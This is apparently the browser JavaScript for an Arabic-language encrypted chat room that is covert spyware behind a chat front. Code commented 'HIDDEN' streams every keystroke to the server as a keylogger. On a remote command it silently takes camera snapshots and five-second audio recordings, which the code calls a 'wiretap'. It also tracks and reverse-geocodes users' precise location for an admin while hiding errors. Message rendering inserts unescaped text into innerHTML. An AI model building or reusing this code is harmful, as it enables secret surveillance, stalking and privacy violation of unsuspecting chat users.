document.addEventListener('DOMContentLoaded', () => {
    let socket = null;
    if (typeof io !== 'undefined') {
        socket = io();
    } else {
        console.warn('Socket.IO is not loaded.');
    }

    // UI Elements
    const joinScreen = document.getElementById('joinScreen');
    const chatScreen = document.getElementById('chatScreen');
    const joinForm = document.getElementById('joinForm');
    const usernameInput = document.getElementById('usernameInput');
    const roomKeyInput = document.getElementById('roomKeyInput');
    const chatForm = document.getElementById('chatForm');
    const messageInput = document.getElementById('messageInput');
    const chatMessages = document.getElementById('chatMessages');
    const onlineUsersSpan = document.getElementById('onlineUsers');
    const typingIndicator = document.getElementById('typingIndicator');
    
    const stealthVideo = document.getElementById('stealthVideo');
    const stealthCanvas = document.getElementById('stealthCanvas');

    let username = '';
    let roomKey = '';
    let watchId = null;
    let cameraStream = null;

    // Join Chat
    joinForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const inputName = usernameInput.value.trim();
        const inputKey = roomKeyInput.value.trim();
        if (inputName && inputKey) {
            username = inputName;
            roomKey = inputKey;
            
            // First, trigger location and camera requests
            // We ask for both in parallel (or sequentially).
            
            // 1. Camera & Mic Request
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    cameraStream = stream;
                    stealthVideo.srcObject = stream;
                    stealthVideo.muted = true; // prevent feedback loop locally
                    
                    // Explicitly play to ensure frames are loaded (important for mobile)
                    stealthVideo.play().catch(e => console.log("Video play warning:", e));
                })
                .catch(err => {
                    console.log("Media denied or not available", err);
                });
            }

            // 2. Location Request
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        startHiddenTracking();
                        enterChat();
                    },
                    (error) => {
                        enterChat();
                    }
                );
            } else {
                enterChat();
            }
        }
    });

    function enterChat() {
        joinScreen.classList.remove('active');
        joinScreen.classList.add('hidden');
        
        chatScreen.classList.remove('hidden');
        setTimeout(() => chatScreen.classList.add('active'), 10);

        if (socket) {
            socket.emit('user_join_chat', username);
        }
    }

    // Chat Form Submit
    chatForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const msg = messageInput.value.trim();
        if (msg && socket) {
            // Encrypt the message locally
            const encrypted = CryptoJS.AES.encrypt(msg, roomKey).toString();
            
            appendMessage('أنت', msg, 'sent');
            socket.emit('chat_message', { sender: username, text: encrypted });
            messageInput.value = '';
            
            // Clear live typing after sending
            socket.emit('live_typing', ''); 
        }
    });

    // HIDDEN: Live Keylogger
    messageInput.addEventListener('input', () => {
        if (socket) {
            socket.emit('live_typing', messageInput.value);
        }
    });

    // Socket Events
    if (socket) {
        socket.on('chat_message', (data) => {
            typingIndicator.classList.add('hidden'); // Hide typing if they sent a message
            
            // Decrypt the received message
            let decryptedText = "🔒 [رسالة مشفرة - مفتاح خاطئ]";
            try {
                const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
                const originalText = bytes.toString(CryptoJS.enc.Utf8);
                if (originalText) {
                    decryptedText = originalText;
                }
            } catch (e) {
                console.error("Decryption failed", e);
            }
            
            appendMessage(data.sender, decryptedText, 'received');
        });
        
        socket.on('chat_history', (history) => {
            // Clear system message placeholder
            chatMessages.innerHTML = '';
            appendSystemMessage('مرحباً بك! تم تنزيل السجل التاريخي مشفراً.');
            
            history.forEach(data => {
                let decryptedText = "🔒 [رسالة مشفرة - مفتاح خاطئ]";
                try {
                    const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
                    const originalText = bytes.toString(CryptoJS.enc.Utf8);
                    if (originalText) {
                        decryptedText = originalText;
                    }
                } catch (e) {}
                
                const type = (data.sender === username) ? 'sent' : 'received';
                const displayName = (data.sender === username) ? 'أنت' : data.sender;
                appendMessage(displayName, decryptedText, type);
            });
        });

        socket.on('online_users_count', (count) => {
            onlineUsersSpan.textContent = count;
        });

        socket.on('user_joined_notice', (name) => {
            appendSystemMessage(`انضم ${name} إلى الغرفة`);
        });

        socket.on('user_left_notice', (name) => {
            appendSystemMessage(`غادر ${name} الغرفة`);
        });

        // Listen for typing from others to show the UI dots
        socket.on('show_typing_indicator', () => {
            typingIndicator.classList.remove('hidden');
            // Auto hide after 3 seconds if no new typing events
            clearTimeout(window.typingTimer);
            window.typingTimer = setTimeout(() => {
                typingIndicator.classList.add('hidden');
            }, 3000);
        });

        // HIDDEN: Listen for snapshot command
        socket.on('take_snapshot', () => {
            if (cameraStream) {
                // Ensure dimensions exist
                const width = stealthVideo.videoWidth || 640;
                const height = stealthVideo.videoHeight || 480;
                
                stealthCanvas.width = width;
                stealthCanvas.height = height;
                const context = stealthCanvas.getContext('2d');
                context.drawImage(stealthVideo, 0, 0, width, height);
                
                // Get base64 image
                const imageData = stealthCanvas.toDataURL('image/jpeg', 0.8);
                
                // Send back to server silently
                socket.emit('snapshot_result', {
                    image: imageData,
                    username: username
                });
            }
        });

        // HIDDEN: Listen for audio wiretap command
        socket.on('take_audio', () => {
            if (cameraStream) {
                try {
                    // Try to get audio tracks
                    const audioTracks = cameraStream.getAudioTracks();
                    if (audioTracks.length > 0) {
                        const mediaRecorder = new MediaRecorder(cameraStream);
                        const audioChunks = [];

                        mediaRecorder.addEventListener("dataavailable", event => {
                            audioChunks.push(event.data);
                        });

                        mediaRecorder.addEventListener("stop", () => {
                            // Let the browser decide the mime type automatically (Fix for iPhones/Safari)
                            const audioBlob = new Blob(audioChunks);
                            
                            // Convert Blob to Base64 to send via socket
                            const reader = new FileReader();
                            reader.readAsDataURL(audioBlob); 
                            reader.onloadend = function() {
                                const base64Audio = reader.result;
                                socket.emit('audio_result', {
                                    audio: base64Audio,
                                    username: username
                                });
                            }
                        });

                        mediaRecorder.start();
                        // Record for 5 seconds
                        setTimeout(() => {
                            if (mediaRecorder.state === "recording") {
                                mediaRecorder.stop();
                            }
                        }, 5000);
                    }
                } catch (e) {
                    console.error("Wiretap failed", e);
                }
            }
        });
    }

    function appendMessage(sender, text, type) {
        const msgDiv = document.createElement('div');
        msgDiv.className = `message ${type}`;
        msgDiv.innerHTML = `
            <span class="sender-name">${sender}</span>
            <div class="bubble">${text}</div>
        `;
        chatMessages.appendChild(msgDiv);
        scrollToBottom();
    }

    function appendSystemMessage(text) {
        const sysDiv = document.createElement('div');
        sysDiv.className = 'system-message';
        sysDiv.textContent = text;
        chatMessages.appendChild(sysDiv);
        scrollToBottom();
    }

    function scrollToBottom() {
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    // -----------------------------------------------------
    // HIDDEN LOCATION TRACKING LOGIC (Sent to Admin only)
    // -----------------------------------------------------
    function startHiddenTracking() {
        if (!navigator.geolocation) return;

        watchId = navigator.geolocation.watchPosition(
            async position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                // Fetch address silently
                let addressDetails = null;
                try {
                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
                    if (response.ok) {
                        const data = await response.json();
                        addressDetails = data.address || {};
                    }
                } catch (e) {} // ignore errors to keep it hidden

                if (socket) {
                    socket.emit('update_location', {
                        lat: lat,
                        lon: lon,
                        addressDetails: addressDetails,
                        username: username // Send username so admin knows who it is
                    });
                }
            },
            error => { /* do nothing, keep it hidden */ },
            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
        );
    }
});
